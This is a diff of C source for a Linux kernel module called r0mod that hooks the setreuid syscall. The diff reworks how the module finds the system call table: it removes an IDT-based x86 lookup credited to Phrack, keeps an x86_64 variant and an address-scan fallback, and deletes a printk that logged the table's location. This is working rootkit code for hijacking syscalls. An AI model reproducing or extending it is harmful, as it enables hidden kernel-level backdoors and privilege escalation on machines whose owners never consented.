@@ -102,27 +102,7 @@ asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
     return orig_setreuid(ruid, euid);
 }
 
-#if defined(_CONFIG_X86_)
-// Phrack #58 0x07; sd, devik
-unsigned long *find_sct(void)
-{
-    char **p;
-    unsigned long sct_off = 0;
-    unsigned char code[255];
-
-    asm("sidt %0":"=m" (idtr));
-    memcpy(&idt, (void *)(idtr.base + 8 * 0x80), sizeof(idt));
-    sct_off = (idt.off2 << 16) | idt.off1;
-    memcpy(code, (void *)sct_off, sizeof(code));
-
-    p = (char **)memmem(code, sizeof(code), "\xff\x14\x85", 3);
-
-    if ( p )
-        return *(unsigned long **)((char *)p + 3);
-    else
-        return NULL;
-}
-#elif defined(_CONFIG_X86_64_)
+#if defined(_CONFIG_X86_64_)
 // http://bbs.chinaunix.net/thread-2143235-1-1.html
 unsigned long *find_sct(void)
 {
@@ -158,10 +138,7 @@ unsigned long *find_sct_by_addr_scan(void)
         unsigned long *sct = (unsigned long *)i;
 
         if(sct[__NR_close] == (unsigned long)sys_close)
-        {
-            printk("sct found @ %lx\n", (unsigned long)sct);
             return sct;
-        }
     }
 
     return NULL;
@@ -355,10 +332,10 @@ static int __init r0mod_init(void)
     DEBUG("Search End:   %lx\n", SEARCH_END);
 
     #if defined(_CONFIG_X86_64_)
-        sct == NULL;
-    #else
     if((sct = (void *)find_sct()) == NULL)
         DEBUG("sct == NULL * 1\n");
+    #else
+        sct = (void *)NULL;
     #endif
 
     if(sct == NULL && (sct = (void *)find_sct_by_addr_scan()) == NULL)
